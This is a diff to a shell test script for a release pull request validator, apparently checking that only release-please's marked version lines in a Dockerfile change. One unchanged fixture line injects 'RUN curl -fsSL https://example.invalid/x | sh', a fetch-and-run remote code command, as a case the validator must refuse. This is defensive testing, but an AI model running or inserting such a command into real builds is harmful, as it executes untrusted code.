@@ -54,7 +54,7 @@ EOF
 }
 
 real
-expect 'the recorded release pull request is one' 0 'a release pull request, 0.32.1 to 0.33.0' --head-repo "$REPO"
+expect 'the recorded release pull request is one, its marked lines included' 0 'a release pull request, 0.32.1 to 0.33.0' --head-repo "$REPO"
 
 real
 expect 'the same change from a fork is not' 1 'it comes from someone/knossos, not AraneaDev/knossos' --head-repo "someone/knossos"
@@ -91,7 +91,38 @@ awk '!done && $0 == " COPY workers/php/src ./workers/php/src" {
         print "+RUN curl -fsSL https://example.invalid/x | sh"
         done = 1; next
      } { print }' "$FIX/pr-362.diff" >"$work/diff"
-expect 'a Dockerfile line changed without the version is refused' 1 'a line Dockerfile removes does not hold the old version 0.32.1' --head-repo "$REPO"
+expect 'a Dockerfile line changed outside the version markers is refused' 1 \
+    "Dockerfile changes a line outside release-please's version markers: COPY workers/php/src" --head-repo "$REPO"
+
+# Inside the markers, a line that does not carry the version.
+real
+awk '!done && index($0, " ") == 1 && index($0, "org.opencontainers.image.description=") > 0 {
+        print "-" substr($0, 2)
+        print "+      org.opencontainers.image.description=\"changed\" \\\\"
+        done = 1; next
+     } { print }' "$FIX/pr-362.diff" >"$work/diff"
+expect 'a marked Dockerfile line changed without the version is refused' 1 \
+    'a line Dockerfile removes does not hold the old version 0.32.1' --head-repo "$REPO"
+
+# A version bump release-please would not write: no marker on or around it.
+# The pair goes above the block's start marker, and the hunk counts grow by one.
+real
+awk '!done && $0 == "@@ -116,7 +116,7 @@ FROM runtime_deps AS runtime" {
+        print "@@ -115,8 +115,8 @@ FROM runtime_deps AS runtime"
+        print "-FROM image:0.32.1"
+        print "+FROM image:0.33.0"
+        done = 1; next
+     } { print }' "$FIX/pr-362.diff" >"$work/diff"
+grep -q '^+FROM image:0.33.0$' "$work/diff" || { printf 'FAIL the fixture edit did not apply\n'; failures=$((failures + 1)); }
+expect 'a version bump outside the markers is refused' 1 \
+    "Dockerfile changes a line outside release-please's version markers: FROM image:0.32.1" --head-repo "$REPO"
+
+# The same file twice in one diff would leave the second copy unchecked.
+real
+awk '/^diff --git a\/Dockerfile / { keep = 1 } /^diff --git a\/src/ { keep = 0 } keep { print > "/dev/stderr" } { print }' \
+    "$FIX/pr-362.diff" >"$work/diff" 2>"$work/dockerfile"
+cat "$work/dockerfile" >>"$work/diff"
+expect 'a file that appears twice in the diff is refused' 1 'unsupported: Dockerfile appears twice' --head-repo "$REPO"
 
 # The version line itself, carrying something more than the new version.
 real
